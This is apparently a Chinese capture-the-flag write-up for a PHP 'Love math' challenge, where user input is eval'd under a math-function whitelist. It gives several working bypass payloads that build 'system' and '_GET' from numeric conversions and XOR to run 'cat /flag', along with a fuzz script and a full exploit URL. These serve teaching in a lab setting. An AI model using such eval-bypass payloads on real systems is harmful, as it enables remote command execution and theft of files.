

## Love math

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

* 动态函数
php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数
例如：`$function = "sayHello";$function();`

* php中函数名默认为字符串
例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择

思路1 --
方法1
```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat%20/flag
```
base_convert(696468,10,36) => "exec"
dechex(1598506324)  => "_GET"
$pi(8768397090111664438,10,30) => "getallheaders" 

方法2 -- getallheaders
burp抓包在Content-Length下一行，不加空行, 将1:cat /flag作为header传入了
Content-Length: 11
1: cat /flag

exec(getallheaders(){1}) //操作xx和yy，中间用逗号隔开，echo都能输出 echo xx,yy

方法3: 强制传参
exp=cat /flag&abs=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){abs}($$pi{exp})
```
base_convert(37907361743,10,36)  => hex2bin
dechex(1598506324)               => 5f474554  即 _GET 的 16进制
($$pi){abs}($$pi{exp})           => $GET['abs']('exp')
```
思路2 --

直接想办法catflag也是可以的

```
//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
```

思路3 --
前面都是利用白名单的数学函数将数字转成字符串，其实也可以
这是fuzz脚本

```
<?php
$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($k=1;$k<=sizeof($payload);$k++){
    for($i = 0;$i < 9; $i++){
        for($j = 0;$j <=9;$j++){
            $exp = $payload[$k] ^ $i.$j;
            echo($payload[$k]."^$i$j"."==>$exp");
            echo "<br />";
        }
    }
}

```

`http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag`

